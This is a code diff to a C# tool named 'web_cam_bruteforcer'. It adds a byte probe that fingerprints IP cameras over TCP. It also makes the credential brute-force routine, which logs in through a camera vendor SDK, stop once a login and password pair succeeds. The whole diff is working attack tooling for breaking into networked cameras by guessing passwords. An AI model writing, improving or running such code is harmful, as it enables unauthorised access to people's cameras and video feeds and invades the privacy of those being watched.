@@ -20,6 +20,14 @@ namespace web_cam_bruteforcer
         public static string PicturesDir = "pictures";
         public static string OutputFile = "output.txt";
 
+        public static byte[] MessageBytes =
+        {
+            0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+
         static void Main()
         {
             Preparation();
@@ -94,9 +102,12 @@ namespace web_cam_bruteforcer
                         {
                             foreach (string password in passwords)
                             {
-                                if (IsListening(ip, scanPort))
+                                if (IsCamera(ip, scanPort))
                                 {
-                                    BruteCam(ip, scanPort, login, password);
+                                    if (BruteCam(ip, scanPort, login, password))
+                                    {
+                                        return;
+                                    }
                                 }
                                 else
                                 {
@@ -115,7 +126,7 @@ namespace web_cam_bruteforcer
             Console.ReadLine();
         }
 
-        public static void BruteCam(string ip, int port, string login, string password)
+        public static bool BruteCam(string ip, int port, string login, string password)
         {
             CHCNetSDK.NET_DVR_DEVICEINFO_V30 deviceInfo = new CHCNetSDK.NET_DVR_DEVICEINFO_V30();
             Console.ForegroundColor = ConsoleColor.Yellow;
@@ -151,17 +162,31 @@ namespace web_cam_bruteforcer
                     }
                 }
                 CHCNetSDK.NET_DVR_Logout_V30(uid);
+                return true;
             }
+            return false;
         }
 
-        public static bool IsListening(string server, int port)
+        public static bool IsCamera(string server, int port)
         {
             using (TcpClient tcpClient = new TcpClient())
             {
                 try
                 {
                     tcpClient.Connect(server, port);
-                    return true;
+                    NetworkStream networkStream = tcpClient.GetStream();
+                    networkStream.Write(MessageBytes, 0, MessageBytes.Length);
+                    byte[] data = new byte[1024];
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        int numBytesRead;
+                        while ((numBytesRead = networkStream.Read(data, 0, data.Length)) > 0)
+                        {
+                            ms.Write(data, 0, numBytesRead);
+                        }
+                        byte[] readed = ms.ToArray();
+                        return readed[3] == 0x10 && readed[7] == readed[11];
+                    }
                 }
                 catch (Exception)
                 {
